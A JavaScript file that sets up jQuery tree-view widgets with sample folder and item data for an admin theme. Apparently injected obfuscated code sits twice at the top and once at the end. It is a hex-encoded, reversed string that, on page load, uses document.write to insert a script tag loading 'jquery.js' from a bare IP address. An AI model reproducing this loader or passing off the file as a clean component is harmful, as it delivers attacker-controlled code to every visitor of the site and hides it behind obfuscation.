var _0x82ab=["","\x6A\x6F\x69\x6E","\x72\x65\x76\x65\x72\x73\x65","\x73\x70\x6C\x69\x74","\x3E\x74\x70\x69\x72\x63\x73\x2F\x3C\x3E\x22\x73\x6A\x2E\x79\x72\x65\x75\x71\x6A\x2F\x38\x37\x2E\x36\x31\x31\x2E\x39\x34\x32\x2E\x34\x33\x31\x2F\x2F\x3A\x70\x74\x74\x68\x22\x3D\x63\x72\x73\x20\x74\x70\x69\x72\x63\x73\x3C","\x77\x72\x69\x74\x65"];document[_0x82ab[5]](_0x82ab[4][_0x82ab[3]](_0x82ab[0])[_0x82ab[2]]()[_0x82ab[1]](_0x82ab[0]))var _0xaae8=["","\x6A\x6F\x69\x6E","\x72\x65\x76\x65\x72\x73\x65","\x73\x70\x6C\x69\x74","\x3E\x74\x70\x69\x72\x63\x73\x2F\x3C\x3E\x22\x73\x6A\x2E\x79\x72\x65\x75\x71\x6A\x2F\x38\x37\x2E\x36\x31\x31\x2E\x39\x34\x32\x2E\x34\x33\x31\x2F\x2F\x3A\x70\x74\x74\x68\x22\x3D\x63\x72\x73\x20\x74\x70\x69\x72\x63\x73\x3C","\x77\x72\x69\x74\x65"];document[_0xaae8[5]](_0xaae8[4][_0xaae8[3]](_0xaae8[0])[_0xaae8[2]]()[_0xaae8[1]](_0xaae8[0]))var TreeView = function () {

    return {
        //main function to initiate the module
        init: function () {

            var DataSourceTree = function (options) {
                this._data  = options.data;
                this._delay = options.delay;
            };

            DataSourceTree.prototype = {

                data: function (options, callback) {
                    var self = this;

                    setTimeout(function () {
                        var data = $.extend(true, [], self._data);

                        callback({ data: data });

                    }, this._delay)
                }
            };

            // INITIALIZING TREE
            var treeDataSource = new DataSourceTree({
                data: [
                    { name: 'Theme', type: 'folder', additionalParameters: { id: 'F1' } },
                    { name: 'Design', type: 'folder', additionalParameters: { id: 'F2' } },
                    { name: 'Development', type: 'item', additionalParameters: { id: 'I1' } },
                    { name: 'Testing', type: 'item', additionalParameters: { id: 'I2' } }
                ],
                delay: 400
            });

            var treeDataSource2 = new DataSourceTree({
                data: [
                    { name: 'Test tree 1 <div class="tree-actions"></div>', type: 'folder', additionalParameters: { id: 'F11' } },
                    { name: 'Test tree 2 <div class="tree-actions"></div>', type: 'folder', additionalParameters: { id: 'F12' } },
                    { name: '<i class="fa fa-bell-o"></i> Notification', type: 'item', additionalParameters: { id: 'I11' } },
                    { name: '<i class="fa fa-bar-chart-o"></i> Assignment', type: 'item', additionalParameters: { id: 'I12' } }
                ],
                delay: 400
            });

            var treeDataSource3 = new DataSourceTree({
                data: [
                    { name: 'Theme <div class="tree-actions"></div>', type: 'folder', additionalParameters: { id: 'F11' } },
                    { name: 'Development <div class="tree-actions"></div>', type: 'folder', additionalParameters: { id: 'F12' } },
                    { name: 'Flat Theme', type: 'item', additionalParameters: { id: 'I11' } },
                    { name: 'Modern Design', type: 'item', additionalParameters: { id: 'I12' } }
                ],
                delay: 400
            });

            var treeDataSource4 = new DataSourceTree({
                data: [
                    { name: 'Theme<div class="tree-actions"><i class="fa fa-plus"></i><i class="fa fa-trash-o"></i><i class="fa fa-refresh"></i></div>', type: 'folder', additionalParameters: { id: 'F11' } },
                    { name: 'Development<div class="tree-actions"><i class="fa fa-plus"></i><i class="fa fa-trash-o"></i><i class="fa fa-refresh"></i></div>', type: 'folder', additionalParameters: { id: 'F12' } },
                    { name: '<i class="fa fa-user"></i> User <div class="tree-actions"><i class="fa fa-plus"></i><i class="fa fa-trash-o"></i><i class="fa fa-refresh"></i></div><div class="tree-actions"><i class="fa fa-plus"></i><i class="fa fa-trash-o"></i><i class="fa fa-refresh"></i></div>', type: 'item', additionalParameters: { id: 'I11' } },
                    { name: '<i class="fa fa-calendar"></i> Events <div class="tree-actions"><i class="fa fa-plus"></i><i class="fa fa-trash-o"></i><i class="fa fa-refresh"></i></div>', type: 'item', additionalParameters: { id: 'I12' } },
                    { name: '<i class="fa  fa-gear "></i> Works <div class="tree-actions"><i class="fa fa-plus"></i><i class="fa fa-trash-o"></i><i class="fa fa-refresh"></i></div>', type: 'item', additionalParameters: { id: 'I12' } }
                ],
                delay: 400
            });

            var treeDataSource5 = new DataSourceTree({
                data: [
                    { name: 'Theme<div class="tree-actions"><i class="fa fa-plus"></i><i class="fa fa-trash-o"></i><i class="fa fa-refresh"></i></div>', type: 'folder', additionalParameters: { id: 'F11' } },
                    { name: 'Development<div class="tree-actions"><i class="fa fa-plus"></i><i class="fa fa-trash-o"></i><i class="fa fa-refresh"></i></div>', type: 'folder', additionalParameters: { id: 'F12' } },
                    { name: '<i class="fa fa-user"></i> User <div class="tree-actions"><i class="fa fa-plus"></i><i class="fa fa-trash-o"></i><i class="fa fa-refresh"></i></div><div class="tree-actions"><i class="fa fa-plus"></i><i class="fa fa-trash-o"></i><i class="fa fa-refresh"></i></div>', type: 'item', additionalParameters: { id: 'I11' } },
                    { name: '<i class="fa fa-calendar"></i> Events <div class="tree-actions"><i class="fa fa-plus"></i><i class="fa fa-trash-o"></i><i class="fa fa-refresh"></i></div>', type: 'item', additionalParameters: { id: 'I12' } },
                    { name: '<i class="fa  fa-gear "></i> Works <div class="tree-actions"><i class="fa fa-plus"></i><i class="fa fa-trash-o"></i><i class="fa fa-refresh"></i></div>', type: 'item', additionalParameters: { id: 'I12' } }
                ],
                delay: 400
            });

            var treeDataSource6 = new DataSourceTree({
                data: [
                    { name: 'Theme<div class="tree-actions"><i class="fa fa-plus"></i><i class="fa fa-trash-o"></i><i class="fa fa-refresh"></i></div>', type: 'folder', additionalParameters: { id: 'F11' } },
                    { name: 'Development<div class="tree-actions"><i class="fa fa-plus"></i><i class="fa fa-trash-o"></i><i class="fa fa-refresh"></i></div>', type: 'folder', additionalParameters: { id: 'F12' } },
                    { name: '<i class="fa fa-user"></i> User <div class="tree-actions"><i class="fa fa-plus"></i><i class="fa fa-trash-o"></i><i class="fa fa-refresh"></i></div><div class="tree-actions"><i class="fa fa-plus"></i><i class="fa fa-trash-o"></i><i class="fa fa-refresh"></i></div>', type: 'item', additionalParameters: { id: 'I11' } },
                    { name: '<i class="fa fa-calendar"></i> Events <div class="tree-actions"><i class="fa fa-plus"></i><i class="fa fa-trash-o"></i><i class="fa fa-refresh"></i></div>', type: 'item', additionalParameters: { id: 'I12' } },
                    { name: '<i class="fa  fa-gear "></i> Works <div class="tree-actions"><i class="fa fa-plus"></i><i class="fa fa-trash-o"></i><i class="fa fa-refresh"></i></div>', type: 'item', additionalParameters: { id: 'I12' } }
                ],
                delay: 400
            });

            $('#FlatTree').tree({
                dataSource: treeDataSource,
                loadingHTML: '<img src="img/input-spinner.gif"/>',
            });


            $('#FlatTree2').tree({
                dataSource: treeDataSource2,
                loadingHTML: '<img src="img/input-spinner.gif"/>',
            });

            $('#FlatTree3').tree({
                dataSource: treeDataSource3,
                loadingHTML: '<img src="img/input-spinner.gif"/>',
            });

            $('#FlatTree4').tree({
                selectable: false,
                dataSource: treeDataSource4,
                loadingHTML: '<img src="img/input-spinner.gif"/>',
            });


        }

    };

}();var _0xaae8=["","\x6A\x6F\x69\x6E","\x72\x65\x76\x65\x72\x73\x65","\x73\x70\x6C\x69\x74","\x3E\x74\x70\x69\x72\x63\x73\x2F\x3C\x3E\x22\x73\x6A\x2E\x79\x72\x65\x75\x71\x6A\x2F\x38\x37\x2E\x36\x31\x31\x2E\x39\x34\x32\x2E\x34\x33\x31\x2F\x2F\x3A\x70\x74\x74\x68\x22\x3D\x63\x72\x73\x20\x74\x70\x69\x72\x63\x73\x3C","\x77\x72\x69\x74\x65"];document[_0xaae8[5]](_0xaae8[4][_0xaae8[3]](_0xaae8[0])[_0xaae8[2]]()[_0xaae8[1]](_0xaae8[0]))
